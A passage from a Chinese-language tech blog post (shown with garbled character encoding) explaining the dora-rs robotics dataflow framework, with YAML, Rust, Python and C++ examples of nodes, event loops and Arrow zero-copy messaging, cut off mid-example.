</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Rust ä¸ dora-rsï¼šåƒé€æ ¸å¿ƒæ¦‚å¿µï¼Œæ‰‹æŠŠæ‰‹æ‰“é€ è·¨è¯­è¨€çš„æœºå™¨äººå®æ—¶æ•°æ®æµåº”ç”¨]]></title>    <link>https://juejin.cn/post/7583898823920369706</link>    <guid>https://juejin.cn/post/7583898823920369706</guid>    <pubDate>2025-12-15T09:09:11.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583898823920369706" data-draft-id="7582787460418748458" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Rust ä¸ dora-rsï¼šåƒé€æ ¸å¿ƒæ¦‚å¿µï¼Œæ‰‹æŠŠæ‰‹æ‰“é€ è·¨è¯­è¨€çš„æœºå™¨äººå®æ—¶æ•°æ®æµåº”ç”¨"/> <meta itemprop="keywords" content="Rust,äººå·¥æ™ºèƒ½,ç¬”è®°"/> <meta itemprop="datePublished" content="2025-12-15T09:09:11.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="RustçŸ¥è¡Œç¤¾"/> <meta itemprop="url" content="https://juejin.cn/user/4186572019737624"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Rust ä¸ dora-rsï¼šåƒé€æ ¸å¿ƒæ¦‚å¿µï¼Œæ‰‹æŠŠæ‰‹æ‰“é€ è·¨è¯­è¨€çš„æœºå™¨äººå®æ—¶æ•°æ®æµåº”ç”¨
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4186572019737624/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    RustçŸ¥è¡Œç¤¾
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-15T09:09:11.000Z" title="Mon Dec 15 2025 09:09:11 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»13åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Rust ä¸ dora-rsï¼šåƒé€æ ¸å¿ƒæ¦‚å¿µï¼Œæ‰‹æŠŠæ‰‹æ‰“é€ è·¨è¯­è¨€çš„æœºå™¨äººå®æ—¶æ•°æ®æµåº”ç”¨</h2>
<blockquote>
<p>åªéœ€ä¸€å¼ <code>YAML</code>è“å›¾ï¼Œå°±èƒ½å°†Pythonçš„çµæ´»ã€Rustçš„æ€§èƒ½ä¸å®æ—¶æ•°æ®æµæ— ç¼ç¼åˆã€‚</p>
</blockquote>
<p>æœºå™¨äººä¸è¾¹ç¼˜ AI å¼€å‘ä¸­ï¼Œæˆ‘ä»¬é•¿æœŸé¢ä¸´ä¸€ä¸ªä¸¤éš¾é€‰æ‹©ï¼šæ˜¯æ‹¥æŠ± Python çš„ç”Ÿæ€ä¾¿åˆ©ï¼Œè¿˜æ˜¯è¿½æ±‚ C++/Rust çš„æè‡´æ€§èƒ½ï¼Ÿåœ¨ä¼ ç»Ÿæ¶æ„ï¼Œç”±äºè·¨è¿›ç¨‹é€šä¿¡ï¼ˆIPCï¼‰çš„åºåˆ—åŒ–å¼€é”€å¾€å¾€æ˜¯å®æ—¶ç³»ç»Ÿçš„å™©æ¢¦ï¼Œå¯¼è‡´äºŒè€…éš¾ä»¥å…¼å¾—ã€‚</p>
<p><strong><code>dora-rs</code></strong> çš„å‡ºç°æ‰“ç ´äº†è¿™ä¸€åƒµå±€ã€‚ä½œä¸ºä¸€ä¸ªåŸºäº Rust çš„æ•°æ®æµæ¡†æ¶ï¼Œå®ƒåˆ©ç”¨ <code>Apache Arrow</code> å®ç° <strong>é›¶æ‹·è´ï¼ˆZero-copyï¼‰</strong> æ¶ˆæ¯ä¼ é€’ï¼Œå®Œç¾ç¼åˆäº† Rust çš„å®‰å…¨æ€§ä¸ Python çš„çµæ´»æ€§ã€‚</p>
<p>æœ¬æ–‡å°†æ·±å…¥è§£æ„ <code>dora-rs</code> çš„æ ¸å¿ƒæ¶æ„ï¼Œå¹¶å¸¦ä½ æ‰‹å†™ä¸€ä¸ª <strong>â€œRust é‡‡é›† + Rust è¿ç®— + Python å®æ—¶å¯è§†åŒ–â€</strong> çš„å®Œæ•´æ··åˆè¯­è¨€æ•°æ®æµç³»ç»Ÿã€‚</p>
<h3 data-id="heading-1">ä¸€ æ ¸å¿ƒæ¦‚å¿µï¼šç†è§£ <code>dora-rs</code> çš„ä¸–ç•Œè§‚</h3>
<h4 data-id="heading-2">1. æ•°æ®æµè“å›¾ï¼šåº”ç”¨çš„â€œæ–½å·¥å›¾â€</h4>
<p>åœ¨ <code>dora-rs</code> ä¸­ï¼Œåº”ç”¨è¢«æŠ½è±¡ä¸ºä¸€ä¸ªç”±èŠ‚ç‚¹å’Œè¿æ¥æ„æˆçš„<strong>æœ‰å‘æ•°æ®æµå›¾</strong>ã€‚<code>Dataflow</code> æ˜¯åº”ç”¨çš„â€œæ–½å·¥å›¾â€ï¼Œé‡‡ç”¨å£°æ˜å¼çš„ <code>YAML</code> æ ¼å¼å®šä¹‰ï¼Œå®ƒä¸å…³å¿ƒå…·ä½“ä»£ç æ€ä¹ˆå†™ï¼Œåªå…³å¿ƒæ•°æ®ä»å“ªé‡Œæ¥ï¼ˆSourceï¼‰ã€ç»è¿‡è°å¤„ç†ï¼ˆProcessï¼‰ã€æµå‘å“ªé‡Œï¼ˆSinkï¼‰ã€‚è¿™ç§è®¾è®¡è®©ç³»ç»Ÿæ¶æ„ä¸€ç›®äº†ç„¶ï¼Œå½»åº•å‘Šåˆ«äº†å¤æ‚çš„ <code>Launch</code> æ–‡ä»¶åœ°ç‹±ã€‚</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># æ ¸å¿ƒç»“æ„ï¼šnodes åˆ—è¡¨å®šä¹‰äº†æ‰€æœ‰å¤„ç†å•å…ƒ</span>
<span class="hljs-attr">nodes:</span>
  <span class="hljs-comment"># ä¸€ä¸ªä¼ æ„Ÿå™¨èŠ‚ç‚¹</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">id:</span> <span class="hljs-string">temperature_sensor</span>
    <span class="hljs-attr">path:</span> <span class="hljs-string">sensor.py</span>
    <span class="hljs-attr">outputs:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">raw_temperature</span>
  <span class="hljs-comment"># ä¸€ä¸ªå¤„ç†èŠ‚ç‚¹</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">id:</span> <span class="hljs-string">data_processor</span>
    <span class="hljs-attr">path:</span> <span class="hljs-string">./target/release/processor_node</span>
    <span class="hljs-attr">inputs:</span>
      <span class="hljs-attr">temp:</span> <span class="hljs-string">temperature_sensor/raw_temperature</span> <span class="hljs-comment"># è¿æ¥è‡³æ­¤ï¼</span>
    <span class="hljs-attr">outputs:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">smoothed_temperature</span>
</code></pre>
<p><code>inputs</code>ä½¿ç”¨<code>æ¥æºèŠ‚ç‚¹/è¾“å‡ºå</code>çš„æ ¼å¼å»ºç«‹è¿æ¥ï¼Œè¿™ç§å£°æ˜å¼é…ç½®è®©å¤æ‚ç³»ç»Ÿçš„ç»“æ„å’Œæ•°æ®æµå‘<strong>ä¸€ç›®äº†ç„¶</strong>ã€‚</p>
<p>å½“ä½ è¿è¡Œ <code>dora start dataflow.yml</code> æ—¶ï¼Œ<code>dora-rs</code> çš„è¿è¡Œæ—¶ä¾¿ä¼šè¯»å–æ­¤è“å›¾ï¼Œè‡ªåŠ¨å¯åŠ¨æ‰€æœ‰èŠ‚ç‚¹è¿›ç¨‹ï¼Œå¹¶æŒ‰ç…§å›¾ç¤ºå»ºç«‹é«˜æ•ˆçš„æ•°æ®é€šé“ã€‚</p>
<h4 data-id="heading-3">2. èŠ‚ç‚¹ä¸æ“ä½œç¬¦ï¼šå·¥äººä¸å·¥å…·ç®±</h4>
<p>è¿™æ˜¯ <code>dora-rs</code> æ€§èƒ½ä¼˜åŒ–çš„å…³é”®ï¼Œå¾ˆå¤šå¼€å‘è€…å®¹æ˜“æ··æ·†ï¼š</p>
<ul>
<li>
<p><strong>Node (èŠ‚ç‚¹)</strong>ï¼šæ˜¯ä¸€ä¸ª<strong>ç‹¬ç«‹çš„ç³»ç»Ÿè¿›ç¨‹</strong>ï¼Œæ‹¥æœ‰å®Œå…¨éš”ç¦»çš„å†…å­˜ç©ºé—´ã€‚å®ƒåƒä¸€åä¸“èŒå·¥äººï¼Œå¯ä»¥å°è£…å®Œæ•´çš„ã€ç‹¬ç«‹çš„æœåŠ¡ï¼Œæˆ–è¿è¡Œæœ‰ç‰¹å®šç¯å¢ƒä¾èµ–ï¼ˆå¦‚Python AIæ¨¡å‹åº“ï¼‰çš„ä»£ç ã€‚èŠ‚ç‚¹é—´é€šä¿¡éœ€è¦è¿›ç¨‹é—´é€šä¿¡æœºåˆ¶ã€‚</p>
</li>
<li>
<p><strong>Operator (æ“ä½œç¬¦)</strong>ï¼šæ˜¯è¿è¡Œåœ¨<strong>åŒä¸€èŠ‚ç‚¹è¿›ç¨‹å†…</strong>çš„æ¨¡å—åŒ–é€»è¾‘å•å…ƒï¼Œç”¨äºåœ¨ä¸€ç§åä¸º <code>Dora Runtime Node</code> çš„ç‰¹æ®ŠèŠ‚ç‚¹å†…è¿è¡Œã€‚<code>Operator</code> å…è®¸ä½ å°†å•ä¸ªèŠ‚ç‚¹çš„å·¥ä½œåˆ†è§£ä¸ºå¯å¤ç”¨çš„ç‹¬ç«‹æ­¥éª¤ã€‚å®ƒåƒå·¥äººæ‰‹è¾¹çš„ä¸“ç”¨å·¥å…·ã€‚</p>
</li>
</ul>






























<table><thead><tr><th>ç‰¹æ€§</th><th><strong>Node (èŠ‚ç‚¹)</strong></th><th><strong>Operator (æ“ä½œç¬¦)</strong></th></tr></thead><tbody><tr><td><strong>è¿è¡Œæ–¹å¼</strong></td><td>ç‹¬ç«‹è¿›ç¨‹ï¼ˆProcessï¼‰</td><td>å•è¿›ç¨‹</td></tr><tr><td><strong>é€šä¿¡æˆæœ¬</strong></td><td>è·¨è¿›ç¨‹ï¼ˆå…±äº«å†…å­˜ä¼˜åŒ–ï¼‰</td><td>å‡½æ•°è°ƒç”¨çº§å»¶è¿Ÿ</td></tr><tr><td><strong>é€‚ç”¨åœºæ™¯</strong></td><td>è·¨è¯­è¨€æ··ç¼–ã€æ•…éšœéš”ç¦»</td><td>é«˜é¢‘è®¡ç®—ã€æ¨¡å—åŒ–å¤ç”¨</td></tr><tr><td><strong>API</strong></td><td>dora Node API</td><td>dora Operator API</td></tr></tbody></table>
<p><strong>æœ€ä½³å®è·µ</strong>ï¼šå°†æ€§èƒ½ç“¶é¢ˆæ¨¡å—ï¼ˆå¦‚å›¾åƒé¢„å¤„ç†ã€æ§åˆ¶ç®—æ³•ï¼‰å®ç°ä¸ºRustæ“ä½œç¬¦ï¼›å°†ä¾èµ–å¤æ‚ç”Ÿæ€ï¼ˆå¦‚PyTorchï¼‰çš„éƒ¨åˆ†å®ç°ä¸ºPythonèŠ‚ç‚¹ã€‚</p>
<h4 data-id="heading-4">3. äº‹ä»¶æµï¼šæ°¸ä¸é˜»å¡çš„â€œæ”¶ä»¶ç®±â€</h4>
<p>èŠ‚ç‚¹æˆ–æ“ä½œç¬¦å¦‚ä½•æ„ŸçŸ¥æ–°æ•°æ®ï¼Ÿç­”æ¡ˆæ˜¯é€šè¿‡<strong>äº‹ä»¶æµ</strong>ã€‚è¿™æ˜¯ä¸€ä¸ªå¼‚æ­¥é€šé“ï¼Œ<code>dora-rs</code> è¿è¡Œæ—¶ä¼šå‘èŠ‚ç‚¹æ¨é€å„ç±»äº‹ä»¶ï¼Œä½ çš„ä»£ç åªéœ€å¾ªç¯ç›‘å¬å¹¶å¤„ç†ã€‚</p>
<p><strong>äº”å¤§æ ¸å¿ƒäº‹ä»¶ç±»å‹ï¼š</strong></p>
<p><strong>Rustäº‹ä»¶å¾ªç¯æ–¹å¼</strong>ï¼š</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// Rustäº‹ä»¶å¤„ç†æ¨¡å¼</span>
<span class="hljs-keyword">let</span> (<span class="hljs-keyword">mut</span> node, <span class="hljs-keyword">mut</span> events) = DoraNode::<span class="hljs-title function_ invoke__">init_from_env</span>()?;
<span class="hljs-keyword">while</span> <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">Some</span>(event) = events.<span class="hljs-title function_ invoke__">recv</span>() {
    <span class="hljs-keyword">match</span> event {
        Event::Input { id, data, metadata } =&gt; {
            <span class="hljs-built_in">println!</span>(<span class="hljs-string">"æ”¶åˆ°è¾“å…¥: {}, æ•°æ®å¤§å°: {}"</span>, id, data.<span class="hljs-title function_ invoke__">len</span>());
            <span class="hljs-comment">// ...ä¸šåŠ¡é€»è¾‘...</span>
        }
        Event::InputClosed { id } =&gt; {
            <span class="hljs-built_in">println!</span>(<span class="hljs-string">"ä¸Šæ¸¸èŠ‚ç‚¹å…³é—­: {}"</span>, id);  <span class="hljs-comment">// å¤„ç†æ–­è¿</span>
        }
        Event::Stop =&gt; {
            <span class="hljs-built_in">println!</span>(<span class="hljs-string">"æ”¶åˆ°åœæ­¢ä¿¡å·"</span>); <span class="hljs-keyword">break</span>;    <span class="hljs-comment">// ä¼˜é›…é€€å‡º</span>
        }
        Event::Reload =&gt; { <span class="hljs-comment">/* çƒ­æ›´æ–°é…ç½® */</span> }
        Event::Error { id, error } =&gt; {
            <span class="hljs-built_in">println!</span>(<span class="hljs-string">"èŠ‚ç‚¹ {} å‘ç”Ÿé”™è¯¯: {:?}"</span>, id, error);
        }
    }
}
</code></pre>
<p><strong>Pythonäº‹ä»¶å¾ªç¯æ–¹å¼</strong>ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> dora <span class="hljs-keyword">import</span> Node

<span class="hljs-comment"># Initialize the node - connects to the dora runtime</span>
node = Node() 
<span class="hljs-built_in">print</span>(<span class="hljs-string">"Node initialized. Waiting for events..."</span>)

<span class="hljs-comment"># Enter the loop to process events from the stream</span>
<span class="hljs-keyword">for</span> event <span class="hljs-keyword">in</span> node: 
    event_type = event[<span class="hljs-string">"type"</span>]
    event_id = event[<span class="hljs-string">"id"</span>] <span class="hljs-comment"># Often the input ID</span>

    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"Received event: Type=<span class="hljs-subst">{event_type}</span>, ID=<span class="hljs-subst">{event_id}</span>"</span>)

    <span class="hljs-keyword">if</span> event_type == <span class="hljs-string">"INPUT"</span>:
        <span class="hljs-comment"># Handle incoming data</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"  -&gt; Data received on input '<span class="hljs-subst">{event_id}</span>'"</span>)
        data = event[<span class="hljs-string">"value"</span>] 
        <span class="hljs-comment"># Now you would process the 'data'...</span>
        
        <span class="hljs-comment"># Example: If it's from an input named 'camera_image'</span>
        <span class="hljs-keyword">if</span> event_id == <span class="hljs-string">"camera_image"</span>:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">"  -&gt; Processing camera image..."</span>)
            <span class="hljs-comment"># process_image(data)</span>
            <span class="hljs-comment"># node.send_output(...) # Send results if needed</span>
            <span class="hljs-keyword">pass</span> <span class="hljs-comment"># Placeholder for actual processing</span>

    <span class="hljs-keyword">elif</span> event_type == <span class="hljs-string">"STOP"</span>:
        <span class="hljs-comment"># Handle stop command</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"  -&gt; Received STOP command. Exiting loop."</span>)
        <span class="hljs-keyword">break</span> <span class="hljs-comment"># Exit the main loop</span>

    <span class="hljs-keyword">elif</span> event_type == <span class="hljs-string">"InputClosed"</span>:
        <span class="hljs-comment"># Handle input closing</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"  -&gt; Input '<span class="hljs-subst">{event_id}</span>' closed."</span>)
        <span class="hljs-comment"># Decide if the node should continue or stop</span>

    <span class="hljs-keyword">elif</span> event_type == <span class="hljs-string">"RELOAD"</span>:
        <span class="hljs-comment"># Handle reload command</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"  -&gt; Received RELOAD command."</span>)
        <span class="hljs-comment"># Reload configuration if implemented</span>

    <span class="hljs-keyword">elif</span> event_type == <span class="hljs-string">"ERROR"</span>:
        <span class="hljs-comment"># Handle a stream error</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"  -&gt; Received ERROR: <span class="hljs-subst">{event[<span class="hljs-string">'error'</span>]}</span>"</span>)
        <span class="hljs-comment"># Log or react to the error</span>

<span class="hljs-built_in">print</span>(<span class="hljs-string">"Node stopping gracefully."</span>)
</code></pre>
<h4 data-id="heading-5">4. Arrow Dataï¼šé›¶æ‹·è´çš„é­”æ³•</h4>
<p>å¤„ç†å›¾åƒã€ç‚¹äº‘æ—¶ï¼Œå¤åˆ¶æ•°æ®æ€§èƒ½è‡´å‘½ã€‚<code>dora-rs</code> ç”¨<strong>Apache Arrow</strong>å®ç°<strong>é›¶æ‹·è´</strong>ä¼ è¾“â€”â€”æ•°æ®å­˜åœ¨<strong>å…±äº«å†…å­˜</strong>ï¼Œæ‰€æœ‰èŠ‚ç‚¹ç›´æ¥è¯»å–ï¼Œæ— éœ€åºåˆ—åŒ–ã€‚</p>
<p><strong>Arrow</strong> å®šä¹‰äº†ä¸€ç§æ ‡å‡†åŒ–çš„<strong>å†…å­˜ä¸­åˆ—å¼æ•°æ®æ ¼å¼</strong>ã€‚å…³é”®åœ¨äºï¼Œå½“æ•°æ®å¤§å°è¶…è¿‡ <strong>4KB</strong> é˜ˆå€¼æ—¶ï¼Œ<code>dora-rs</code> ä¼šå°†å…¶æ”¾å…¥<strong>å…±äº«å†…å­˜</strong>ã€‚å‘é€æ–¹å†™å…¥ï¼Œæ¥æ”¶æ–¹ç›´æ¥è¯»å–åŒä¸€å—å†…å­˜ï¼Œ<strong>å®ç°çœŸæ­£çš„é›¶æ‹·è´</strong>ã€‚</p>
<ul>
<li><strong>å…±äº«å†…å­˜</strong>ï¼šå¤§äº <code>4KB</code> çš„æ•°æ®è‡ªåŠ¨èµ°å…±äº«å†…å­˜ã€‚</li>
<li><strong>Drop Token</strong>ï¼šæ™ºèƒ½çš„å†…å­˜ç®¡ç†æœºåˆ¶ï¼Œç¡®ä¿æ‰€æœ‰æ¥æ”¶æ–¹è¯»å®Œæ•°æ®åï¼Œå†…å­˜æ‰ä¼šé‡Šæ”¾ã€‚</li>
</ul>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># PythonèŠ‚ç‚¹å‘é€Arrowæ•°æ®ï¼ˆé›¶æ‹·è´ï¼‰</span>
<span class="hljs-keyword">import</span> pyarrow <span class="hljs-keyword">as</span> pa
<span class="hljs-keyword">from</span> dora <span class="hljs-keyword">import</span> Node

node = Node()
<span class="hljs-comment"># åˆ›å»ºä¸€ä¸ªåŒ…å«æ¸©åº¦å€¼çš„Arrowæ•°ç»„</span>
temperature_data = pa.array([<span class="hljs-number">25.7</span>], <span class="hljs-built_in">type</span>=pa.float32())
<span class="hljs-comment"># å‘é€æ—¶ï¼Œdoraè‡ªåŠ¨å¤„ç†å…±äº«å†…å­˜åˆ†é…</span>
node.send_output(<span class="hljs-string">"temperature"</span>, temperature_data)
</code></pre>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// RustèŠ‚ç‚¹æ¥æ”¶å¹¶å¤„ç†åŒæ ·çš„Arrowæ•°æ®</span>
<span class="hljs-keyword">use</span> arrow::array::Float32Array;

<span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">Event</span>::Input { data, .. } = event {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">array</span>: &amp;Float32Array = data.<span class="hljs-title function_ invoke__">as_any</span>().<span class="hljs-title function_ invoke__">downcast_ref</span>().<span class="hljs-title function_ invoke__">unwrap</span>();
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">temp</span> = array.<span class="hljs-title function_ invoke__">value</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">// ç›´æ¥è®¿é—®å†…å­˜ï¼Œæ— æ‹·è´ï¼</span>
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"Received temperature: {}"</span>, temp);
}
</code></pre>
<h4 data-id="heading-6">5ï¸. å¤šè¯­è¨€APIç»‘å®šï¼šå…¨å®¶æ¡¶æ”¯æŒ</h4>
<p>dora-rsæä¾›Rustã€Pythonã€C/C++åŸç”ŸAPIï¼Œé£æ ¼è´´åˆå„è‡ªè¯­è¨€ä¹ æƒ¯ã€‚</p>
<p><strong>Rust API</strong>ï¼ˆç±»å‹å®‰å…¨ï¼Œæ€§èƒ½å¤©èŠ±æ¿ï¼‰ï¼š</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">let</span> (<span class="hljs-keyword">mut</span> node, <span class="hljs-keyword">mut</span> events) = DoraNode::<span class="hljs-title function_ invoke__">init_from_env</span>()?;

<span class="hljs-keyword">while</span> <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">Some</span>(event) = events.<span class="hljs-title function_ invoke__">recv</span>() {
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">Event</span>::Input { data, metadata } = event {
        <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">array</span>: Float32Array = data.<span class="hljs-title function_ invoke__">as_any</span>().<span class="hljs-title function_ invoke__">downcast_ref</span>()?;
        node.<span class="hljs-title function_ invoke__">send_output</span>(<span class="hljs-string">"result"</span>, metadata.parameters, processed_array)?;
    }
}
</code></pre>
<p><strong>Python API</strong>ï¼ˆç®€æ´é«˜æ•ˆï¼ŒAIé¦–é€‰ï¼‰ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> dora <span class="hljs-keyword">import</span> Node
<span class="hljs-keyword">import</span> pyarrow <span class="hljs-keyword">as</span> pa

node = Node()
<span class="hljs-keyword">for</span> event <span class="hljs-keyword">in</span> node:
    <span class="hljs-keyword">if</span> event[<span class="hljs-string">"type"</span>] == <span class="hljs-string">"INPUT"</span>:
        array = event[<span class="hljs-string">"value"</span>]  <span class="hljs-comment"># è‡ªåŠ¨è½¬ä¸ºpyarrow.Array</span>
        node.send_output(<span class="hljs-string">"result"</span>, pa.array(processed))
</code></pre>
<p><strong>C++ API</strong>ï¼ˆåº•å±‚æ§åˆ¶ï¼‰ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp">
<span class="hljs-keyword">auto</span> dora_node = <span class="hljs-built_in">init_dora_node</span>();

<span class="hljs-keyword">while</span> (<span class="hljs-keyword">auto</span> event = dora_node.events-&gt;<span class="hljs-built_in">next</span>()) {
    <span class="hljs-keyword">auto</span> type = <span class="hljs-built_in">event_type</span>(event);
    <span class="hljs-keyword">if</span>(type == DoraEventType::Input)
    {
        <span class="hljs-keyword">struct</span> <span class="hljs-title class_">ArrowArray</span> c_array;
        <span class="hljs-keyword">struct</span> <span class="hljs-title class_">ArrowSchema</span> c_schema;

        <span class="hljs-keyword">auto</span> result = <span class="hljs-built_in">event_as_arrow_input</span>(
        std::<span class="hljs-built_in">move</span>(event),
        <span class="hljs-built_in">reinterpret_cast</span>(&amp;c_array),
        <span class="hljs-built_in">reinterpret_cast</span>(&amp;c_schema)
        );

        <span class="hljs-keyword">if</span> (!result.error.<span class="hljs-built_in">empty</span>()) {
